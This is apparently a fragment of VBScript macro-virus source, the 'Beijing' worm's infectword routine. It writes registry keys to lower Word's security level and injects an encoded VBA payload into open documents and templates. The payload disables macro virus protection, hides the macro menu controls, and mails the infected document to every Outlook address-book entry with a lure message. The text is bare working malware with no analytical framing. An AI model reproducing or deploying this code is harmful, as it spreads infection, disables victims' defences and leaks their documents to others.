Sub infectword(WShell)
On Error Resume Next
WShell.RegWrite xx&"Office\9.0\Word\Security\Level",1,"REG_DWORD"
WShell.RegWrite xx&"Office\10.0\Word\Security\Level",1,"REG_DWORD"
Set owa = GetObject(, "Word.Application")
If owa = "" Then
Set owa = CreateObject("Word.Application")
End If
s="'Beijing 2008$-$'   ¡ð¡ð¡ð$-$'    ¡ð¡ð$-$'¡þ¡þ¡þ¡þ¡þ¡þ$-$Dim b As String$-$Dim a$-$Private Sub Document_Open()$-$s$-$sm$-$g$-$End Sub$-$Private Sub Document_Close()$-$s$-$   $-$g$-$End Sub$-$Sub FileOpen()$-$On Error Resume Next$-$alt$-$Dialogs(wdDialogFileOpen).Show$-$g$-$End Sub$-$Sub g()$-$On Error Resume Next$-$b = @-@@-@$-$For Each Vs In MacroContainer.VBProject.vbcomponents$-$If Vs.Name = @-@Beijing@-@ Then Set Vs = Vs.CodeModule: Exit For$-$Next Vs$-$b = Vs.lines(1, Vs.CountOfLines)$-$Set a = Documents$-$i 0$-$Set a = Templates$-$i 1$-$End Sub$-$Sub s()$-$On Error Resume Next$-$System.PrivateProfileString(@-@@-@, @-@HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security@-@, @-@Level@-@) = 1&$-$For Each l In CommandBars(@-@tools@-@).Controls$-$If l.ID = 751 Or l.ID=30017 Then l.visible =False$-$Next l$-$Application.EnableCancelKey = wdCancelDisabled$-$WordBasic.DisableAutoMacros 0$-$With Options$-$.VirusProtection = False$-$.AllowFastSave = True$-$.SavePropertiesPrompt = False$-$.SaveNormalPrompt = False$-$.ConfirmConversions = False$-$End With$-$End Sub$-$Sub sm()$-$On Error Resume Next$-$Set out = CreateObject(@-@Outlook.Application@-@)$-$Set mp = out.GetNameSpace(@-@MAPI@-@)$-$mp.Logon @-@profile@-@, @-@password@-@$-$For x = 1 To mp.AddressLists.Count$-$Set ak = mp.AddressLists(x)$-$Set im = out.CreateItem(0)$-$For xx = 1 To ak.AddressEntries.Count$-$ad = ak.AddressEntries(xx)$-$im.Recipients.Add ad$-$Next xx$-$im.Subject = @-@? ? ?@-@$-$im.Body = @-@Hello! I know you are so busy....Is this the document you need?@-@ & Chr(13) & Chr(10) & Chr(13) & Chr(10) & Application.UserName$-$im.Attachments.Add ActiveDocument.FullName$-$im.Send$-$Next x$-$mp.Logoff$-$End Sub$-$Sub alt()$-$On Error Resume Next$-$If Day(Now) = 28 Then$-$With Assistant.NewBalloon$-$.Icon = msoIconMsAlert$-$.Text = @-@Beijing 2008 welcome you!!!Thanks for you support.@-@$-$.Heading = @-@Hellow!Are you busy!@-@$-$.Animation = msoAnimationWorkingAtSomething$-$.Show$-$End With$-$Assistant.Visible = True$-$End If$-$End Sub$-$Sub i(fplace As Integer)$-$On Error Resume Next$-$Dim aa(85) As String$-$For Each doc In a$-$Set t = doc.VBProject.vbcomponents.Item(1)$-$If t.Name <> @-@Beijing@-@ Then$-$t.CodeModule.deletelines 1, t.CodeModule.CountOfLines$-$t.CodeModule.InsertLines 1, b$-$t.Name = @-@Beijing@-@$-$If fplace = 1 Then$-$aa(23) = @-@Sub gg()@-@$-$aa(83) = @-@Sub ii(fplace As Integer)@-@$-$aa(35) = @-@Sub ss()@-@$-$aa(51) = @-@Sub smm()@-@$-$aa(70) = @-@Sub altt()@-@$-$aa(7) = @-@Public Sub AutoOpen()@-@$-$aa(8) = @-@   @-@$-$aa(9) = @-@   @-@$-$aa(10) = @-@gg@-@$-$aa(12) = @-@Sub AutoClose()@-@$-$aa(13) = @-@ss@-@$-$aa(14) = @-@smm@-@$-$aa(15) = @-@gg@-@$-$aa(17) = @-@Sub FileSave()@-@$-$aa(19) = @-@altt@-@$-$aa(20) = @-@ActiveDocument.Save:ActiveDocument.Saved = False@-@$-$aa(21) = @-@gg@-@$-$aa(31) = @-@ii 0@-@$-$aa(33) = @-@ii 1@-@$-$Else$-$aa(23) = @-@Sub g()@-@$-$aa(83) = @-@Sub i(fplace As Integer)@-@$-$aa(35) = @-@Sub s()@-@$-$aa(51) = @-@Sub sm()@-@$-$aa(70) = @-@Sub alt()@-@$-$aa(7) = @-@Private Sub Document_Open()@-@$-$aa(8) = @-@s@-@$-$aa(9) = @-@sm@-@$-$aa(10) = @-@g@-@$-$aa(12) = @-@Private Sub Document_Close()@-@$-$aa(13) = @-@s@-@$-$aa(14) = @-@ActiveDocument.Save@-@$-$aa(15) = @-@g@-@$-$aa(17) = @-@Sub FileOpen()@-@$-$aa(19) = @-@alt@-@$-$aa(20) = @-@Dialogs(wdDialogFileOpen).Show@-@$-$aa(21) = @-@g@-@$-$aa(31) = @-@i 0@-@$-$aa(33) = @-@i 1@-@$-$End If$-$Dim nn$-$For nn = 7 To 85$-$If aa(nn) <> @-@@-@ Then$-$t.CodeModule.ReplaceLine nn, aa(nn)$-$End If$-$Next nn$-$End If$-$Next doc$-$End Sub$-$"
s=replace(s,chr(64)&chr(45)&chr(64),"""")
s=replace(s,chr(36)&chr(45)&chr(36),vbcrlf)
set a=owa.Documents
For Each doc In a
set t=doc.VBProject.vbcomponents.Item(1)
If t.Name<>"Beijing" Then
t.codemodule.deletelines 1, t.codemodule.CountOfLines
t.codemodule.InsertLines 1, s '²åÈëºê²¡¶¾´úÂë
t.Name = "Beijing"
End If
Next
For Each l In owa.CommandBars("tools").Controls
If l.ID = 751 Or l.ID=30017 Then l.visible =False
Next
set owa=nothing
End Sub
